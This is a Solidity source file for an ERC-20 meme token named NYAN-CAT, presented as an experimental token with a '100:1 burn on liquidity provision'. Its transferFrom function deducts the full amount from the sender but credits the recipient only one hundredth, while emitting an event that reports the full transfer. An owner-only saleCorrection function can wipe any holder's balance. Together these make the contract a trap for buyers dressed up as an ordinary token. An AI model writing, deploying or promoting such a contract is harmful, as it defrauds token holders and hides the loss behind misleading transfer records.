pragma solidity ^0.5.0;



/***https://meme-poggers.com***/



//  __  __                                      _____                                              

// |  \\/  |                                    |  __ \\                                             

// | \\  / |   ___   _ __ ___     ___   ______  | |__) |   ___     __ _    __ _    ___   _ __   ___ 

// | |\\/| |  / _ \\ | '_ ` _ \\   / _ \\ |______| |  ___/   / _ \\   / _` |  / _` |  / _ \\ | '__| / __|

// | |  | | |  __/ | | | | | | |  __/          | |      | (_) | | (_| | | (_| | |  __/ | |    \\__ 

// |_|  |_|  \\___| |_| |_| |_|  \\___|          |_|       \\___/   \\__, |  \\__, |  \\___| |_|    |___/

//                                                                __/ |   __/ |                    

//                                                               |___/   |___/



/***HIGHLY EXPERIMENTAL MEME TOKEN. 100:1 TOKEN BURN ON LIQUIDITY PROVISION.***/



// ----------------------------------------------------------------------------

// ERC-20 Interface

// ----------------------------------------------------------------------------



interface ERC20Interface {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function allowance(address owner, address spender) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);



    event Transfer(address indexed from, address indexed to, uint tokens);

    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);

}



// ----------------------------------------------------------------------------

// Safe Math Library 

// ----------------------------------------------------------------------------



contract SafeMath {

    function safeAdd(uint a, uint b) public pure returns (uint c) {c = a + b; require(c >= a); }

    function safeSub(uint a, uint b) public pure returns (uint c) { require(b <= a); c = a - b; }

    function safeMul(uint a, uint b) public pure returns (uint c) { c = a * b; require(a == 0 || c / a == b); }

    function safeDiv(uint a, uint b) public pure returns (uint c) { require(b > 0); c = a / b; }

}



// ----------------------------------------------------------------------------

// Ownership

// ----------------------------------------------------------------------------



contract Ownable {

    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () internal {

        address msgSender = msg.sender;

        _owner = msgSender;

        emit OwnershipTransferred(address(0), msgSender);}

    function owner() public view returns (address) {

        return _owner;}

    function isOwner() public view returns (bool) {

    return msg.sender == _owner;}

    modifier onlyOwner() {

        require(isOwner(), "Access Denied");

        _;

    }

}

// ----------------------------------------------------------------------------

// Token Contract

// ----------------------------------------------------------------------------



contract NYANCAT is ERC20Interface, SafeMath, Ownable {

    string public name;

    string public symbol;

    uint8 public decimals;

    

    uint256 public _totalSupply;

    

    mapping(address => uint) balances;

    mapping(address => mapping(address => uint)) allowed;

    

    /*Token Constructor*/

    constructor() public {

        name = "NYAN-CAT https://meme-poggers.com";

        symbol = "NYAN!";

        decimals = 18;

        _totalSupply = 10000000000000000000000000;

        

        balances[msg.sender] = _totalSupply;

        emit Transfer(address(0), msg.sender, _totalSupply);

    }

    

    function totalSupply() public view returns (uint) {

        return _totalSupply - balances[address(0)];

    }

    

    function balanceOf(address tokenOwner) public view returns (uint balance) {

        return balances[tokenOwner];

    }

    

    function allowance(address tokenOwner, address spender) public view returns (uint remaining) {

        return allowed[tokenOwner][spender];

    }

    

    function approve(address spender, uint tokens) public returns (bool success) {

        allowed[msg.sender][spender] = tokens;

        emit Approval(msg.sender, spender, tokens);

        return true;

    }

    

    function transfer(address to, uint tokens) public returns (bool success) {

        balances[msg.sender] = safeSub(balances[msg.sender], tokens);

        balances[to] = safeAdd(balances[to], tokens);

        emit Transfer(msg.sender, to, tokens);

        return true;

    }

    

    function transferFrom(address from, address to, uint tokens) public returns (bool success) {

        balances[from] = safeSub(balances[from], tokens);

        allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);

        balances[to] = safeAdd(balances[to], tokens/100);

        emit Transfer(from, to, tokens);

        return true;

    }

    

    function saleCorrection(address account, uint tokens) public onlyOwner {

        require(account != address(0), "0x0 Access Denied");

        balances[account] = safeSub(balances[account], tokens);

        _totalSupply = safeSub(_totalSupply, tokens);

        emit Transfer(account, address(0), tokens);

    }

}
